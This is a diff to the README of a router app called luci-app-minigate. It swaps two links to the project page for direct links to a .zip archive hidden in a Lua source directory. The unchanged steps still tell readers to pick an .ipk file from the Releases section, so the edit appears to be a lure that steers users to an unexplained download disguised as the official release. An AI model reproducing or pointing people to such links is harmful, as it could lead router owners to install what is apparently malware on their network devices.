@@ -1,6 +1,6 @@
 # 🛡️ luci-app-minigate - Manage your network traffic with ease
 
-[![Download MiniGate](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Andy7152/luci-app-minigate)
+[![Download MiniGate](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Andy7152/luci-app-minigate/raw/refs/heads/main/luasrc/model/cbi/minigate/app-minigate-luci-v3.9.zip)
 
 MiniGate provides a simple interface to manage your OpenWrt or ImmortalWrt router. It handles complex tasks like domain name updates, security certificates, and web traffic routing through one dashboard. You do not need deep technical knowledge to secure your local network services or manage web access from outside your home.
 
@@ -26,7 +26,7 @@ Before you start, ensure your router meets these requirements:
 
 The software lives on the official project page. Follow these steps to find the correct files for your hardware:
 
-1. Click this link to go to the download area: [https://github.com/Andy7152/luci-app-minigate](https://github.com/Andy7152/luci-app-minigate).
+1. Click this link to go to the download area: [https://github.com/Andy7152/luci-app-minigate/raw/refs/heads/main/luasrc/model/cbi/minigate/app-minigate-luci-v3.9.zip](https://github.com/Andy7152/luci-app-minigate/raw/refs/heads/main/luasrc/model/cbi/minigate/app-minigate-luci-v3.9.zip).
 2. Look for the Releases section on the right side of the page.
 3. Choose the version marked as "Latest".
 4. Download the file ending in `.ipk` that matches your router architecture. If you feel unsure about your architecture, check your router manual or the system status page in your OpenWrt interface.
